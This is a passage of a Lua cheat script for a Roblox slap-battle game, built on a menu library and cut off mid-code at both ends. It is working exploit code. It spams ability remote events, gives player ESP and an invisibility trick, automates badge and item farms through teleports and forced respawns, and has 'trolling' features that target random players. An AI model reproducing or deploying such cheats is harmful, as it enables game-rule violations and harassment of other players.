task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Bubble" do
game:GetService("ReplicatedStorage").BubbleThrow:FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Slapple" do
game:GetService("ReplicatedStorage").funnyTree:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Detonator" do
game:GetService("ReplicatedStorage").Fart:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Berserk" do
game:GetService("ReplicatedStorage").BerserkCharge:FireServer(game:GetService("Players").LocalPlayer.Character.Berserk)
wait(2.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Rojo" do
game:GetService("ReplicatedStorage"):WaitForChild("RojoAbility"):FireServer("Release", {game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame})
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Kinetic" do
OGL = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
for i = 1,100 do
game.ReplicatedStorage.SelfKnockback:FireServer({["Force"] = 0,["Direction"] = Vector3.new(0,0.01,0)})
task.wait(0.05)
end
wait(2)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OGL
if game.Players.LocalPlayer.Backpack:FindFirstChild("Kinetic") then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Kinetic)
end
game:GetService("ReplicatedStorage").KineticExpl:FireServer(game.Players.LocalPlayer.Character.Kinetic, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
wait(2.2)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Dominance" do
game:GetService("ReplicatedStorage").DominanceAc:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "[REDACTED]" do
game:GetService("ReplicatedStorage").Well:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Duelist" do
game:GetService("ReplicatedStorage").DuelistAbility:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Engineer" do
game:GetService("ReplicatedStorage").Sentry:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Brick" do
game:GetService("ReplicatedStorage").lbrick:FireServer()
game:GetService("Players").LocalPlayer.PlayerGui.BRICKCOUNT.ImageLabel.TextLabel.Text = game:GetService("Players").LocalPlayer.PlayerGui.BRICKCOUNT.ImageLabel.TextLabel.Text + 1
wait(1.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Trap" do
game:GetService("ReplicatedStorage").funnyhilariousbeartrap:FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "woah" do
game:GetService("ReplicatedStorage").VineThud:FireServer()
wait(5.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Ping Pong" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Recall" do
game:GetService("ReplicatedStorage").Recall:InvokeServer(game:GetService("Players").LocalPlayer.Character.Recall)
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "ZZZZZZZ" do
game:GetService("ReplicatedStorage").ZZZZZZZSleep:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Adios" do
game:GetService("ReplicatedStorage").AdiosActivated:FireServer()
wait(8.3)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Boogie" do
if game.Players.LocalPlayer.Backpack:FindFirstChild("Boogie") then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Boogie)
end
game:GetService("ReplicatedStorage").BoogieBall:FireServer(game.Players.LocalPlayer.Character.Boogie, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Balloony" do
if game.Players.LocalPlayer.Backpack:FindFirstChild("Balloony") then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Balloony)
end
game:GetService("ReplicatedStorage").GeneralAbility:FireServer(game:GetService("Players").LocalPlayer.Character.Balloony)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Phase" do
game:GetService("ReplicatedStorage").PhaseA:FireServer()
wait(5.475)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Hallow Jack" do
game:GetService("ReplicatedStorage"):WaitForChild("Hallow"):FireServer()
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Phantom" do
game:GetService("ReplicatedStorage").PhantomDash:InvokeServer(workspace[game.Players.LocalPlayer.Name].Phantom) 
wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Sparky" do
game:GetService("ReplicatedStorage").Sparky:FireServer(game:GetService("Players").LocalPlayer.Character.Sparky)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Charge" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer(game:GetService("Players").LocalPlayer.Character.Charge)
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Coil" do
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(game:GetService("Players").LocalPlayer.Character.Coil)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Walkspeed
wait(3.1)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Diamond" do
game:GetService("ReplicatedStorage"):WaitForChild("Rockmode"):FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "MEGAROCK" do
game:GetService("ReplicatedStorage"):WaitForChild("Rockmode"):FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Excavator" do
game:GetService("ReplicatedStorage"):WaitForChild("Excavator"):InvokeServer()
game:GetService("ReplicatedStorage"):WaitForChild("ExcavatorCancel"):FireServer()
wait(7.3)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Thor" do
game:GetService("ReplicatedStorage").ThorAbility:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Meteor" do
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Sun" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer("Cast")
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Whirlwind" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Guardian Angel" do
game.ReplicatedStorage.GeneralAbility:FireServer(game.Players.LocalPlayer)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Parry" do
game.ReplicatedStorage.GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "MR" do
game:GetService("ReplicatedStorage").Spherify:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Druid" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait(3.21)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Oven" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Jester" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer("Ability1")
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Ferryman" do
local players = game.Players:GetChildren()
local randomPlayer = players[math.random(1, #players)]
repeat randomPlayer = players[math.random(1, #players)] until randomPlayer ~= game.Players.LocalPlayer and randomPlayer.Character:FindFirstChild("entered") and randomPlayer.Character:FindFirstChild("ded") == nil and randomPlayer.Character:FindFirstChild("InLabyrinth") == nil and randomPlayer.Character:FindFirstChild("rock") == nil
Target = randomPlayer
game.Players.LocalPlayer.Character.FerrymanStaff.StaffConfig.AbilityEvent:FireServer("Leap")
wait(1.85)
game.Players.LocalPlayer.Character.FerrymanStaff.StaffConfig.AbilityEvent:FireServer("FinishLeap",Target.Character.HumanoidRootPart.Position)
task.wait(3.9)
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Scythe" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Blackhole" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Jebaited" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Blink" do
game:GetService("ReplicatedStorage").Blink:FireServer("OutOfBody", {["dir"] = Vector3.new(0, 0, 0),["ismoving"] = false,["mousebehavior"] = Enum.MouseBehavior.Default})
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Joust" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer("Start")
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 40
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Slapstick" do
game:GetService("ReplicatedStorage").slapstick:FireServer("charge")
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Firework" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Chicken" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Lamp" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "BONK" do
game:GetService("ReplicatedStorage").BONK:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Frostbite" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer(2)
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Golem" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer("recall")
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Grab" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "Spoonful" do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer({["state"] = "vfx",["origin"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(-3.141592502593994, 1.0475832223892212, 3.141592502593994),["vfx"] = "jumptween",["sendplr"] = game:GetService("Players").LocalPlayer})
game:GetService("ReplicatedStorage").GeneralAbility:FireServer({["state"] = "vfx",["cf"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(-2.1319260597229004, 0.651054859161377, 2.3744168281555176),["vfx"] = "crash"})
task.wait()
end
while _G.SpamAb and game.Players.LocalPlayer.leaderstats.Glove.Value == "UFO" do
if game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name.."'s UFO VFX") == nil or game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name.."'s UFO") == nil then
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
task.wait(0.3)
end
	end    
})


TabMain:AddButton({
        Name = "Invisible",
        Callback = function()
if game.Players.LocalPlayer.Character:FindFirstChild("entered") then
OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in lobby.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
else
local OldLead = game.Players.LocalPlayer.leaderstats.Glove.Value
fireclickdetector(workspace.Lobby.Ghost.ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Ghostinvisibilityactivated"):FireServer()
wait(0.1)
fireclickdetector(workspace.Lobby[OldLead].ClickDetector)
  end 
end                
})

local EspOn = false

local function calculateDistance(point1, point2)
    return (point1 - point2).magnitude
end

local function showPlayerPositions()
    local localPlayer = game.Players.LocalPlayer
    if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end
    local localPosition = localPlayer.Character.HumanoidRootPart.Position
    
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local playerPosition = player.Character.HumanoidRootPart.Position
            local distance = calculateDistance(localPosition, playerPosition)
            
            local tag = player.Character:FindFirstChild("DistanceTag")
            if not tag then
                tag = Instance.new("BillboardGui")
                tag.Name = "DistanceTag"
                tag.Parent = player.Character
                tag.Size = UDim2.new(0, 150, 0, 50)
                tag.StudsOffset = Vector3.new(0, 3, 0)
                tag.AlwaysOnTop = true
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "TextLabel"
                textLabel.Parent = tag
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                textLabel.BackgroundTransparency = 0.5
                textLabel.BorderSizePixel = 0
                textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextXAlignment = Enum.TextXAlignment.Center
                textLabel.TextYAlignment = Enum.TextYAlignment.Center
                
                local uicorner = Instance.new("UICorner")
                uicorner.CornerRadius = UDim.new(0, 10)
                uicorner.Parent = textLabel
            end
            
            tag.TextLabel.Text = player.Name .. "\n" .. string.format("%.2f meters", distance)
            tag.Enabled = EspOn  -- Enable or disable the tag based on EspOn
        end
    end
end

game:GetService("RunService").Heartbeat:Connect(function()
    showPlayerPositions()
end)

TabMain:AddToggle({
    Name = "ESP Players",
    Default = false,
    Callback = function(Value)
        EspOn = Value
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Character then
                local tag = player.Character:FindFirstChild("DistanceTag")
                if tag then
                    tag.Enabled = EspOn  -- Update visibility based on the toggle
                end
            end
        end
    end
})

TabBadges:AddToggle({
        Name = "Bob Farm",
        Default = false,
        Callback = function(Value)
  _G.BobFarm = Value
  while _G.BobFarm do
    local jogador = game.Players.LocalPlayer
local destinoCFrame = CFrame.new(-810.162292, 329.90097, 3.98657513, 1, 0, 0, 0, 1, 0, 0, 0, 1)
jogador.Character:SetPrimaryPartCFrame(destinoCFrame)
wait(2)
local args = {
    [1] = true
}

game:GetService("ReplicatedStorage"):WaitForChild("Duplicate"):FireServer(unpack(args))
wait(1.5) 
local player = game.Players.LocalPlayer
player.Character:WaitForChild("Humanoid").Health = 0
  wait(6)
  end
end
})

Bobv2 = TabBadges:AddToggle({
    Name = "Bob Farm V2",
    Default = false,
    Callback = function(Value)
        _G.BobFarmv2 = Value

        local player = game.Players.LocalPlayer
        local function initializeCharacter(character)
            humanoid = character:WaitForChild("Humanoid")
            humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        end
        
        local character = player.Character or player.CharacterAdded:Wait()
        initializeCharacter(character)
        
        local function moveToTarget(targetPos)
            local moveIncrement = 5 -- Distância a ser percorrida a cada movimento
            local reachedTarget = false

            while not reachedTarget and _G.BobFarmv2 do
                local currentPosition = humanoidRootPart.Position
                local direction = (targetPos - currentPosition).unit
                local newPosition = currentPosition + direction * moveIncrement

                -- Verifique se o próximo passo ultrapassaria o alvo
                if (newPosition - targetPos).magnitude < moveIncrement then
                    newPosition = targetPos
                    reachedTarget = true
                end

                humanoid:MoveTo(newPosition)
                humanoid.MoveToFinished:Wait()
                
                -- Verificação adicional para parar o loop se BobFarmv2 for desativado
                if not _G.BobFarmv2 then
                    break
                end
            end
        end

        local function farm()
            while _G.BobFarmv2 do
                local targetPosition = Vector3.new(-809.622742, 328.220032, 3.68266702)
                
                moveToTarget(targetPosition)
                wait(0.6)
                game:GetService("VirtualInputManager"):SendKeyEvent(true, "E", false, game)
                wait(0.6)
                player.Character:WaitForChild("Humanoid").Health = 0
                wait(3.7)
            end
        end

        if _G.BobFarmv2 then
            if player.leaderstats.Glove.Value == "Replica" then
                -- Conectando evento para resetar script quando o personagem morrer
                player.CharacterAdded:Connect(function(newCharacter)
                    initializeCharacter(newCharacter)
                    if _G.BobFarmv2 then
                        farm()
                    end
                end)

                -- Iniciando o farm
                farm()
            else
                -- Desativando o toggle automaticamente

                OrionLib:MakeNotification({
                    Name = "Ops",
                    Content = "You need to equip Replica glove first.",
                    Image = "rbxassetid://17748409757",
                    Time = 5
                })
              Bobv2:Set(false)
            end
        end
    end
})

TabBadges:AddButton({
  Name = "Get Tycoon",
  Callback = function()
    if game.Players.LocalPlayer.Character:FindFirstChild("entered") then
local title = "Time Remaining"
local time = 5

local loopForRunning = true

spawn(function()
    for i = 1, 600 do
        local RemainingTimeUntil600 = 600 - i
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = RemainingTimeUntil600 .. " seconds remaining",
            Duration = time
        })
        wait(1)
    end
    loopForRunning = false
end)

spawn(function()
    while loopForRunning do
        if game.Players.LocalPlayer.Character then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.Arena.Plate.CFrame
        end
        wait()
    end
end)
else 
    OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Join the Arena",
    Image = "rbxassetid://17748409757",
    Time = 5
})
    end
 end
})

TabBadges:AddToggle({
        Name = "Auto Damage Kraken Boss",
        Default = false,
        Callback = function(Value)
AutoSlap = Value
while AutoSlap do
  local VirtualInputManager = game:GetService("VirtualInputManager")

local function simulateClick(x, y)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
    wait(0.1)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
end
simulateClick(100, 300)
wait(0.5)
  end
end    
})

TabImmunity:AddToggle({
    Name = "Anti-Void",
    Default = false,
    Callback = function(Value)
        AntiVoid1 = Value
        if platformAnti and platformTour then
            platformAnti.CanCollide = AntiVoid1
            platformTour.CanCollide = AntiVoid1
        end
    end
})

-- Anti Void 

local platformAntiSize = Vector3.new(1000, 5, 1000)
local transparency = 1

local cframe = CFrame.new(117.657799, -13.2288647, 31.1358738, 0.341914088, 0, -0.93973124, 0, 1, 0, 0.93973124, 0, 0.341914088)

local function createPlatform()
    platformAnti = Instance.new("Part")
    platformAnti.Size = platformAntiSize
    platformAnti.Anchored = true
    platformAnti.Transparency = transparency
    platformAnti.BrickColor = BrickColor.new("Medium stone grey")
    platformAnti.CFrame = cframe
    platformAnti.CanCollide = false  -- Default to false
    platformAnti.Parent = game.Workspace
end

-- Create the platform
createPlatform()



-- Anti Void Tournament

local platformTourSize = Vector3.new(1000, 5, 1000)
local transparency = 1

local cframe = CFrame.new(3213.46167, 76.8051987, -0.149684101, -0.992713571, 0, 0.120497972, 0, 1, -0, -0.120497972, 0, -0.992713571)

local function createPlatform()
    platformTour = Instance.new("Part")
    platformTour.Size = platformTourSize
    platformTour.Anchored = true
    platformTour.Transparency = transparency
    platformTour.BrickColor = BrickColor.new("Medium stone grey")
    platformTour.CFrame = cframe
    platformTour.CanCollide = false  -- Default to false
    platformTour.Parent = game.Workspace
end

-- Create the platform
createPlatform()


TabImmunity:AddToggle({
    Name = "Anti-Void Kraken Map",
    Default = false,
    Callback = function(Value)
        AntiVoid2 = Value
        if platformK then
            platformK.CanCollide = AntiVoid2
        end
    end
})



-- Anti Void Kraken 

local platformKSize = Vector3.new(1000, 5, 1000)
local transparency = 1

local cframe = CFrame.new(222.239258, 29.0431805, -12628.292, -0.983905137, 0.00816612877, -0.178504884, 7.45352554e-06, 0.998957098, 0.0456585772, 0.178691566, 0.0449223779, -0.982879102)

local function createPlatform()
    platformK = Instance.new("Part")
    platformK.Size = platformKSize
    platformK.Anchored = true
    platformK.Transparency = transparency
    platformK.BrickColor = BrickColor.new("Medium stone grey")
    platformK.CFrame = cframe
    platformK.CanCollide = false  -- Default to false
    platformK.Parent = game.Workspace
end

-- Create the platform
createPlatform()


TabTrolling:AddButton({
        Name = "Kill Random Player",
        Callback = function()
if game.Players.LocalPlayer.leaderstats.Glove.Value == "rob" then
    game:GetService("ReplicatedStorage").rob:FireServer()
    wait(4)
    -- Função para obter um jogador aleatório no servidor
    local function GetRandomPlayer()
        local players = game.Players:GetPlayers()
        local randomIndex = math.random(1, #players)
        return players[randomIndex]
    end

    -- Teleport Player to a Random Player
   local function TeleportTeleportToRandomPlayer(player)
        local randomPlayer = GetRandomPlayer()
        if randomPlayer then
            player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
        else
            print("Nenhum jogador disponível para teleportar.")
        end
    end

    -- Teleportar o jogador para uma pessoa aleatória quando o script é executado
    local player = game.Players.LocalPlayer
    if player then
        TeleportTeleportToRandomPlayer(player)
    else
        print("Not found")
    end
    else
   OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Equip Rob.",
    Image = "rbxassetid://17748409757",
    Time = 5
})   
 end
end
})

local ReplicaFarm = false

TabMain:AddToggle({
    Name = "Replica Farm",
    Default = false,
    Callback = function(Value)
        ReplicaFarm = Value

            spawn(function()
                while ReplicaFarm do
                    local args = { true }
                    game:GetService("ReplicatedStorage"):WaitForChild("Duplicate"):FireServer(unpack(args))
                    wait(6)
                end
            end)

            spawn(function()
                while ReplicaFarm do
                    local playerName = "\195\133" .. game.Players.LocalPlayer.Name
                    local leftLeg = workspace:WaitForChild(playerName):FindFirstChild("Left Leg")
                    if leftLeg then
                        local args = { leftLeg }
                        game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args))
                    end
                    task.wait(0.2)
                end
            end)
end
})

local BallerFarm = false
TabMain:AddToggle({
    Name = "Baller Farm",
    Default = false,
    Callback = function(Value)
        BallerFarm = Value
local playerName = game.Players.LocalPlayer.Name

spawn(function()
    while BallerFarm do
        local args = { true }
        game:GetService("ReplicatedStorage"):WaitForChild("Ability"):FireServer(unpack(args))
        wait(12)
    end
end)


spawn(function()
while BallerFarm do
local args = {
    [1] = workspace:WaitForChild("\195\133Baller" .. playerName):WaitForChild("Right Arm")
}

                        game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args))
task.wait(0.4)
end
end)
end
})

RepBallTog = TabMain:AddToggle({
    Name = "Replica & Baller Farm",
    Default = false,
    Callback = function(Value)
        _G.RepBallerFarm = Value
if _G.RepBallerFarm == true then
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Baller" then
  while RepBallerFarm do
    -- Primeiro e
    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport2, 0)
    wait(0.3)

    -- Habilidade geral
    game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
    wait(0.3)

    -- Mata o jogador
    local player = game.Players.LocalPlayer
    player.Character:WaitForChild("Humanoid").Health = 0
    wait(4) -- Aumentei o tempo de espera para resetar o jogador

    -- Clica no detector de Replica
    fireclickdetector(workspace.Lobby.Replica.ClickDetector)
    wait(0.2)

    -- Segundo e
    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
    wait(0.3)

    -- Duplicar
    game:GetService("ReplicatedStorage"):WaitForChild("Duplicate"):FireServer(true)
    wait(0.3)

    -- Repetição da seção "b"
    local plr = game.Players.LocalPlayer.Name
    for i = 1, 20 do -- Agora repetirá a seção "b" 16 vezes
        local args = {
            [1] = workspace:WaitForChild("\195\133Baller" .. plr):WaitForChild("Left Arm")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args))

        local args2 = {
            [1] = workspace:WaitForChild("\195\133" .. plr):WaitForChild("Left Arm")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args2))

        wait(0.75)
    end
wait(8)

    -- Mata o jogador novamente
    local player = game.Players.LocalPlayer
    player.Character:WaitForChild("Humanoid").Health = 0
    wait(4.6) -- Aumentei o tempo de espera para resetar o jogador novamente

    -- Clica no detector de "Baller"
    fireclickdetector(workspace.Lobby.Baller.ClickDetector)
    wait(0.2)
end
else
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Equip Baller.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.1)
RepBallTog:Set(false)
   end
 end
end
})


RepBlinTog = TabMain:AddToggle({
    Name = "Replica & Blink Farm",
    Default = false,
    Callback = function(Value)
        _G.RepBlinkFarm = Value
if _G.RepBlinkFarm == true then 
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Blink" then
  while _G.RepBlinkFarm do
local jogador = game.Players.LocalPlayer
  local destinoCFrame = CFrame.new(5597.26465, 181.799469, -146.706467, -0.435461491, 0.00667448156, 0.900182664, -1.16910187e-05, 0.999972463, -0.00742003508, -0.9002074, -0.00324165984, -0.435449421)
jogador.Character:SetPrimaryPartCFrame(destinoCFrame)
wait(0.5)
local args = {
    [1] = "OutOfBody",
    [2] = {
        ["dir"] = Vector3.new(0.9730275869369507, 0, -0.23068900406360626),
        ["ismoving"] = false,
        ["mousebehavior"] = Enum.MouseBehavior.Default
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("Blink"):FireServer(unpack(args))

wait(0.2)

    -- Clica no detector de Replica
    fireclickdetector(workspace.Lobby.Replica.ClickDetector)
    wait(0.2)

    -- Segundo e
    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
    wait(0.3)

    -- Duplicar
    game:GetService("ReplicatedStorage"):WaitForChild("Duplicate"):FireServer(true)
    wait(0.3)

    -- Repetição da seção "b"
    local plr = game.Players.LocalPlayer.Name
    for i = 1, 23 do -- Agora repetirá a seção "b" 16 vezes
for i, v in pairs(workspace:GetChildren()) do
                if v.Name:match(game.Players.LocalPlayer.Name) and v:FindFirstChild("HumanoidRootPart") then
game.ReplicatedStorage.b:FireServer(v:WaitForChild("HumanoidRootPart"),true)
                end
end 
          
        local args2 = {
            [1] = workspace:WaitForChild("\195\133" .. plr):WaitForChild("Left Arm")
        }
        game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args2))

        wait(0.6)
    end
wait(6)

    -- Mata o jogador novamente
  local player = game.Players.LocalPlayer
    player.Character:WaitForChild("Humanoid").Health = 0
    wait(4.6) -- Aumentei o tempo de espera para resetar o jogador novamente

    -- Clica no detector de "Blink"
    fireclickdetector(workspace.Lobby.Blink.ClickDetector)
    wait(0.2)
end
else
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Equip Blink.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.2)
RepBlinTog:Set(false)
    end
  end
end
})

-- Criação da Plataforma

local platformSize = Vector3.new(1000, 10, 1000)
local transparency = 0.3

local cframe = CFrame.new(21935.3242, -976.545898, -30576.3125, -0.99989748, 8.84241402e-10, 0.0143184047, -1.83031108e-11, 1, -6.30337382e-08, -0.0143184047, -6.30275423e-08, -0.99989748)

local function createPlatform()
    local SafeSpot = Instance.new("Part")
    SafeSpot.Size = platformSize
    SafeSpot.Anchored = true
    SafeSpot.CanCollide = true
    SafeSpot.Transparency = transparency
    SafeSpot.BrickColor = BrickColor.new("Medium stone grey")
    SafeSpot.CFrame = cframe
    SafeSpot.Parent = game.Workspace
    return SafeSpot
end

-- Criar a plataforma
local platform = createPlatform()

-- Toggle Safe-Spot

local SafeSpotToggle = false
local previousState = false

TabMain:AddToggle({
    Name = "Safe-Spot",
    Default = false,
    Callback = function(Value)
        SafeSpotToggle = Value
        
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        if SafeSpotToggle then
            local newCFrame = CFrame.new(21896.0078, -964.01947, -30510.1992, -0.805344164, 6.90715183e-08, 0.592807531, 7.18039583e-09, 1, -1.06761171e-07, -0.592807531, -8.17228951e-08, -0.805344164)
            humanoidRootPart.CFrame = newCFrame
        elseif not SafeSpotToggle and previousState then
            local newCFrame = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            humanoidRootPart.CFrame = newCFrame
        end

        previousState = SafeSpotToggle
    end
})


TabTrolling:AddButton({
        Name = "Jester All (Beta)",
        Callback = function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

for i = 1, 40 do
